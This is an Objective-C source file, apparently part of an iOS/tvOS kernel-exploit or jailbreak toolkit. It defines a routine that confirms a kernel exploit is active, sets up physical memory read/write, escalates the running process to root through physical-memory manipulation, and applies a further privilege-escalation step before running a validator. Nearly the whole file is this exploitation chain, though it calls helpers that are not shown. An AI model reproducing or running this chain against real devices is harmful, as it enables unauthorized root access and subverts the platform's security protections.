#import "dt_build691_client.h"
#import "dt_kcall_planb.h"
#import "dt_physrw.h"
#import "DTRunLogger.h"
#import "kfd_tvos.h"
#import "dt_kernel_exploit.h"
#import "primitives.h"
#import "kernel.h"

#import <unistd.h>

typedef void (^dt691_log_fn)(NSString *line);

static void dt691_log(dt691_log_fn log, NSString *line)
{
    [[DTRunLogger shared] log:line];
    if (log)
        log(line);
}

static void dt691_emit(dt691_log_fn log, NSString *marker)
{
    dt691_log(log, marker);
    [[DTRunLogger shared] logStage:marker];
}

int dt_build691_run_baseline(void (^log)(NSString *line), NSString **verdictOut)
{
    dt691_emit(log, @"KCALL691_PHASE_BEGIN");

    if (!dt_kernel_exploit_is_active()) {
        if (verdictOut)
            *verdictOut = @"KCALL691_KFD_INACTIVE";
        return -1;
    }

    if (dt_build_physrw_handoff_only(log) != 0) {
        if (verdictOut)
            *verdictOut = @"KCALL691_PHYSRW_FAIL";
        return -2;
    }

    if (getuid() != 0) {
        uint64_t proc = proc_find(getpid());
        if (proc && dt_build_phys_root_esc(proc, log) == 0 && getuid() == 0) {
            dt691_log(log, @"[+] build691 root esc OK uid=0");
        }
        if (proc)
            proc_rele(proc);
    }

    if (getuid() != 0) {
        if (verdictOut)
            *verdictOut = @"KCALL691_ROOT_FAIL";
        return -3;
    }

    int priv_r = -1;
    uint64_t self_proc = proc_find(getpid());
    if (self_proc) {
        priv_r = dt_build97_privesc_preserve_slot0(self_proc, log);
        proc_rele(self_proc);
    }
    if (priv_r != 0) {
        if (verdictOut)
            *verdictOut = @"KCALL691_BUILD97_FAIL";
        return -4;
    }

    dt691_emit(log, @"KCALL691_NO_OPAINJECT");
    dt691_emit(log, @"KCALL691_NO_RESTORE");
    dt691_emit(log, @"KCALL691_NO_MUTATION");

    NSString *kernelVerdict = nil;
    int r = dt691_run_baseline_validator(log, &kernelVerdict);
    if (r != 0) {
        if (verdictOut)
            *verdictOut = kernelVerdict ?: @"KCALL691_BASELINE_FAIL";
        return r;
    }

    if (verdictOut)
        *verdictOut = kernelVerdict ?: @"KCALL691_BASELINE_VALIDATOR_PASS";
    dt691_emit(log, @"KCALL691_PHASE_PASS");
    return 0;
}
